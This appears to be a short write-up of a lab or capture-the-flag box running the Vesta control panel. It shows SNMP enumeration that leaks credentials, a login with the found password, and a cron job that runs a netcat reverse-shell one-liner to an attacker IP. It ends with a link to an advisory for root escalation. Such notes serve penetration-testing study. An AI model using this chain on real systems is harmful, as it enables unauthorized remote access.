## Takeaway
- Sometimes, the first letter of username will be capitalized.
- Always search for extended MIB objects when enumerate for `SNMP`.
- When searching for exploit of a software, do not just look for `exploit-db` or `github` but also pay attention to `Security Blog Posts`
## Metadata
- Web App powered by `vesta` control in port `80`
	- same with port `8080`, `8443`.
- `vesta control` login at port `8083`.
- Run `snmpwalk -v 1 -c public 192.168.250.156 NET-SNMP-EXTEND-MIB::nsExtendObjects` to discover potential credential.![[Pasted image 20240314152456.png]]
# Exploitation
## Shell as Jack
- Navigate to `https://192.168.250.156:8083/login` and login using the found credential `Jack:3PUKsX98BMupBiCf`.
- After login as `Jack`, navigate to `https://192.168.250.156:8083/list/cron/` and create a `cron` job running command `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.242 443 >/tmp/f` at a one minute interval.![[Pasted image 20240314161310.png]]![[Pasted image 20240314160906.png]]
- Wait for the `cron` job to execute and catch a reverse shell as `Jack`.![[Pasted image 20240314161124.png]]![[Pasted image 20240314161230.png]]
# PrivEsc
- https://ssd-disclosure.com/ssd-advisory-vestacp-multiple-vulnerabilities/ leads to strictly `root` shell.![[Pasted image 20240314170153.png]]